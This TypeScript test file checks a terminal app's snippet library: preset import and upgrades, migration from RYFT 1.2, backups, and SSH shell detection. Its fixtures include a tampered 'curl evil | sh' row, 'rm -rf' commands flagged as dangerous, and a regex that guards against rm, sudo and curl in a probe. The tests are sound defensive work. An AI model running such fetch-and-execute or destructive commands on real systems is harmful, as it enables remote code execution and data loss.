import { randomUUID } from 'node:crypto';
import { copyFileSync, existsSync, mkdtempSync, rmSync } from 'node:fs';
import { DatabaseSync } from 'node:sqlite';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { PRESET_LIBRARY, type Preset, type PresetLibrary } from '../../src/main/snippets/presets';
import { builtinSnippetId, ReadOnlySnippetError, SnippetRepository } from '../../src/main/snippets/snippetRepository';
import { MIGRATIONS, openDatabase, SCHEMA_VERSION } from '../../src/main/storage/database';
import { UNKNOWN_CONTEXT } from '../../src/shared/features/snippetCompat';
import { createHarness, hostInput, OWNER, type Harness } from '../fixtures/harness';
import { SshFixture } from '../fixtures/sshServer';

const preset = (over: Partial<Preset> = {}): Preset => ({
  id: 'test.one',
  version: 1,
  title: 'Eins',
  description: 'Beschreibung',
  category: 'Test',
  command: 'uptime',
  shells: ['posix'],
  platforms: ['linux'],
  requiredTools: ['uptime'],
  risk: 'safe',
  tags: [],
  params: [],
  ...over
});
const library = (version: number, ...presets: Preset[]): PresetLibrary => ({ version, presets });
const userInput = { name: 'Mein Snippet', description: '', command: 'echo hallo', category: 'Eigene', tags: [], shells: [], params: [], favorite: false };

describe('importing the library', () => {
  let directory: string;
  let db: DatabaseSync;
  let repository: SnippetRepository;
  const builtins = () => repository.list().filter((item) => item.source === 'builtin');

  beforeEach(() => {
    directory = mkdtempSync(join(tmpdir(), 'ryft-presets-'));
    db = openDatabase(join(directory, 'ryft.db'));
    repository = new SnippetRepository(db);
  });
  afterEach(() => {
    db.close();
    rmSync(directory, { recursive: true, force: true });
  });

  it('inserts once, however often it runs', () => {
    expect(repository.importPresets(PRESET_LIBRARY).inserted).toBe(PRESET_LIBRARY.presets.length);
    const before = repository.list();
    for (let run = 0; run < 3; run += 1) {
      expect(repository.importPresets(PRESET_LIBRARY)).toEqual({ inserted: 0, updated: 0, removed: 0, skippedNewer: false });
    }
    expect(repository.list()).toEqual(before);
  });

  it('applies an upgrade in place and keeps id, favorite and creation date', () => {
    repository.importPresets(library(1, preset()));
    const [before] = builtins();
    repository.setFavorite(before!.id, true);
    expect(repository.importPresets(library(2, preset({ version: 2, title: 'Neu', command: 'uptime -p' })))).toMatchObject({ inserted: 0, updated: 1 });
    const [after] = builtins();
    expect(builtins()).toHaveLength(1);
    expect(after).toMatchObject({ id: before!.id, name: 'Neu', command: 'uptime -p', presetVersion: 2, favorite: true, createdAt: before!.createdAt });
  });

  it('never touches personal snippets, whatever they are called', () => {
    const mine = repository.create({ ...userInput, name: 'Eins', command: 'uptime' });
    const copySource = repository.create(userInput);
    repository.importPresets(library(1, preset()));
    repository.importPresets(library(2, preset({ version: 2, command: 'uptime -p' })));
    repository.importPresets(library(3));
    expect(repository.get(mine.id)).toEqual(mine);
    expect(repository.get(copySource.id)).toEqual(copySource);
    expect(repository.list()).toHaveLength(2);
  });

  it('removes a retired preset, but not the copy made of it', () => {
    repository.importPresets(library(1, preset(), preset({ id: 'test.two', title: 'Zwei' })));
    const copy = repository.duplicate(builtinSnippetId('test.two'));
    expect(repository.importPresets(library(2, preset()))).toMatchObject({ removed: 1 });
    expect(builtins().map((item) => item.presetId)).toEqual(['test.one']);
    expect(repository.get(copy.id).source).toBe('user');
  });

  it('adds new presets on upgrade', () => {
    repository.importPresets(library(1, preset()));
    expect(repository.importPresets(library(2, preset(), preset({ id: 'test.two', title: 'Zwei' })))).toMatchObject({ inserted: 1, updated: 0 });
    expect(builtins()).toHaveLength(2);
  });

  it('leaves a library from a newer RYFT alone', () => {
    repository.importPresets(library(5, preset({ version: 5, command: 'neu' })));
    expect(repository.importPresets(library(4, preset({ version: 4, command: 'alt' })))).toMatchObject({ skippedNewer: true });
    expect(builtins()[0]!.command).toBe('neu');
  });

  it('repairs a row that was edited outside of RYFT', () => {
    repository.importPresets(library(1, preset()));
    db.prepare("UPDATE snippets SET command = 'curl evil | sh', risk = 'safe' WHERE presetId = 'test.one'").run();
    expect(repository.importPresets(library(1, preset()))).toMatchObject({ updated: 1 });
    expect(builtins()[0]!.command).toBe('uptime');
  });

  it('cannot end up with two rows for one preset', () => {
    repository.importPresets(library(1, preset()));
    const insert = () =>
      db
        .prepare(
          `INSERT INTO snippets (id, name, description, command, category, tags, shells, params, favorite, createdAt, updatedAt, source, presetId)
           VALUES ('x', 'x', '', 'x', 'x', '[]', '[]', '[]', 0, '', '', 'builtin', 'test.one')`
        )
        .run();
    expect(insert).toThrow(/UNIQUE/);
  });

  it('undoes everything when one preset fails', () => {
    repository.importPresets(library(1, preset()));
    const broken = preset({ id: 'test.broken' });
    (broken as { title: unknown }).title = null;
    expect(() => repository.importPresets(library(2, preset({ version: 2, command: 'geändert' }), broken))).toThrow();
    expect(builtins().map((item) => item.command)).toEqual(['uptime']);
  });

  it('keeps built-in snippets read-only', () => {
    repository.importPresets(library(1, preset()));
    const id = builtinSnippetId('test.one');
    expect(() => repository.update(id, userInput)).toThrow(ReadOnlySnippetError);
    expect(() => repository.delete(id)).toThrow(ReadOnlySnippetError);
    expect(repository.get(id).command).toBe('uptime');
    expect(repository.setFavorite(id, true).favorite).toBe(true);
  });

  it('makes copies the user owns, each with its own name', () => {
    repository.importPresets(library(1, preset({ params: [{ name: 'v', defaultValue: '1', description: '', type: 'integer' }], command: 'uptime {{v}}' })));
    const id = builtinSnippetId('test.one');
    const first = repository.duplicate(id);
    const second = repository.duplicate(id);
    expect(first).toMatchObject({ name: 'Eins (Kopie)', source: 'user', presetId: null, platforms: ['linux'], requiredTools: ['uptime'] });
    expect(first.params[0]!.type).toBe('integer');
    expect(second.name).toBe('Eins (Kopie 2)');
    const edited = repository.update(first.id, { ...userInput, command: 'uptime -p' });
    expect(edited.command).toBe('uptime -p');
    repository.delete(second.id);
    expect(repository.get(id).source).toBe('builtin');
  });

  it('derives the risk of a personal snippet from its command', () => {
    expect(repository.create({ ...userInput, command: 'rm -rf /tmp/x' }).risk).toBe('danger');
    const created = repository.create({ ...userInput, name: 'b', command: 'ls' });
    expect(created.risk).toBe('safe');
    expect(repository.update(created.id, { ...userInput, name: 'b', command: 'rm -rf x' }).risk).toBe('danger');
  });

  it('gives the same preset the same well-formed id on every machine', () => {
    expect(builtinSnippetId('a.b')).toBe(builtinSnippetId('a.b'));
    expect(builtinSnippetId('a.b')).not.toBe(builtinSnippetId('a.c'));
    expect(builtinSnippetId('linux.uptime')).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-a[0-9a-f]{3}-[0-9a-f]{12}$/);
  });
});

describe('upgrading a database from RYFT 1.2', () => {
  let directory: string;
  beforeEach(() => {
    directory = mkdtempSync(join(tmpdir(), 'ryft-upgrade-'));
  });
  afterEach(() => rmSync(directory, { recursive: true, force: true }));

  function databaseFromVersion1_2(path: string): void {
    const db = new DatabaseSync(path);
    for (let version = 0; version < 4; version += 1) db.exec(MIGRATIONS[version] as string);
    db.exec('PRAGMA user_version = 4');
    db.prepare(
      `INSERT INTO snippets (id, name, description, command, category, tags, shells, params, favorite, createdAt, updatedAt)
       VALUES ('11111111-1111-4111-8111-111111111111', 'Offene Ports', 'meins', 'rm -rf /tmp/x', 'Eigene', '["a"]', '["posix"]', '[]', 1, '2026-01-01', '2026-01-02')`
    ).run();
    db.close();
  }

  it('keeps every personal snippet and adds the library next to it', () => {
    const path = join(directory, 'ryft.db');
    databaseFromVersion1_2(path);
    const db = openDatabase(path);
    try {
      expect(existsSync(`${path}.bak-v4`)).toBe(true);
      expect((db.prepare('PRAGMA user_version').get() as { user_version: number }).user_version).toBe(SCHEMA_VERSION);
      const repository = new SnippetRepository(db);
      repository.importPresets(PRESET_LIBRARY);
      const all = repository.list();
      const mine = all.filter((item) => item.source === 'user');
      expect(mine).toHaveLength(1);
      expect(mine[0]).toMatchObject({
        name: 'Offene Ports',
        description: 'meins',
        command: 'rm -rf /tmp/x',
        favorite: true,
        tags: ['a'],
        createdAt: '2026-01-01',
        updatedAt: '2026-01-02',
        platforms: [],
        requiredTools: [],
        presetId: null,
        risk: 'danger'
      });
      expect(all.filter((item) => item.source === 'builtin')).toHaveLength(PRESET_LIBRARY.presets.length);
    } finally {
      db.close();
    }
  });

  it('survives restarts without any duplicates', () => {
    const path = join(directory, 'ryft.db');
    databaseFromVersion1_2(path);
    let count = 0;
    for (let start = 0; start < 3; start += 1) {
      const db = openDatabase(path);
      const repository = new SnippetRepository(db);
      repository.importPresets(PRESET_LIBRARY);
      count = repository.list().length;
      db.close();
    }
    expect(count).toBe(PRESET_LIBRARY.presets.length + 1);
  });

  it('can be restored from the backup', () => {
    const path = join(directory, 'ryft.db');
    databaseFromVersion1_2(path);
    openDatabase(path).close();
    const restored = join(directory, 'restored.db');
    copyFileSync(`${path}.bak-v4`, restored);
    const db = new DatabaseSync(restored);
    expect((db.prepare('SELECT count(*) AS n FROM snippets').get() as { n: number }).n).toBe(1);
    db.close();
  });
});

describe('the running services', () => {
  it('import the library at startup', () => {
    const harness = createHarness();
    try {
      expect(harness.services.snippets.list().filter((item) => item.source === 'builtin')).toHaveLength(PRESET_LIBRARY.presets.length);
    } finally {
      harness.dispose();
    }
  });
});

describe('detecting what an SSH terminal is', () => {
  let harness: Harness;
  let fixture: SshFixture;
  const commands: string[] = [];

  async function openSession(exec: (command: string) => { stdout?: string; code?: number }): Promise<string> {
    const key = harness.services.keys.generate({ name: 'probe', comment: 'x', passphrase: null, rememberPassphrase: false });
    fixture = new SshFixture({
      authorizedKey: key.publicKey,
      exec(command) {
        commands.push(command);
        return exec(command);
      }
    });
    await fixture.listen();
    const host = harness.services.hosts.create(hostInput({ port: fixture.port, authMethod: 'key', keyReference: key.privateKeyPath }));
    harness.answerPrompts((prompt) => (prompt.kind === 'hostKey' ? { kind: 'hostKey', trust: 'once' } : { kind: 'cancel' }));
    const id = harness.sessionId();
    await harness.services.sessions.open(OWNER, id, { kind: 'ssh', hostId: host.id }, 80, 24);
    await harness.waitForState(id, 'connected');
    return id;
  }

  beforeEach(() => {
    harness = createHarness();
    commands.length = 0;
  });
  afterEach(async () => {
    harness.dispose();
    await fixture?.close();
  });

  it('reports what the host says, and only reads to find out', async () => {
    const id = await openSession(() => ({ stdout: 'motd\nryft-os=Linux\nryft-shell=/bin/bash\nryft-tool=docker\nryft-end\n' }));
    const context = await harness.services.detectTerminal(OWNER, id, randomUUID());
    expect(context).toMatchObject({ platform: 'linux', shell: 'posix' });
    expect(context.tools).toMatchObject({ docker: true, ss: false });
    expect(commands).toHaveLength(1);
    // The list of names to look for contains programs like rm, and it is only ever passed to command -v.
    const script = commands[0]!.replace(/for ryft_tool in [^;]*;/, 'for ryft_tool in;');
    expect(script).toContain('command -v "$ryft_tool" >/dev/null 2>&1');
    expect(script).not.toMatch(/\b(?:rm|mv|tee|sudo|curl)\b|>\s*[^/&\s]/);
  });

  it('recognizes PowerShell behind a login that fails the POSIX script', async () => {
    const id = await openSession((command) => (command.startsWith('$PSVersionTable') ? { stdout: '5\r\n' } : { stdout: '', code: 1 }));
    expect(await harness.services.detectTerminal(OWNER, id, randomUUID())).toEqual({ platform: null, shell: 'powershell', tools: null });
  });

  it('stays at unknown when the answer makes no sense', async () => {
    const id = await openSession(() => ({ stdout: 'Welcome to the jungle\n' }));
    expect(await harness.services.detectTerminal(OWNER, id, randomUUID())).toEqual(UNKNOWN_CONTEXT);
  });

  it('refuses a session of somebody else', async () => {
    const id = await openSession(() => ({ stdout: 'ryft-end\n' }));
    await expect(harness.services.detectTerminal(OWNER + 1, id, randomUUID())).rejects.toThrow();
    expect(commands).toHaveLength(0);
  });
});
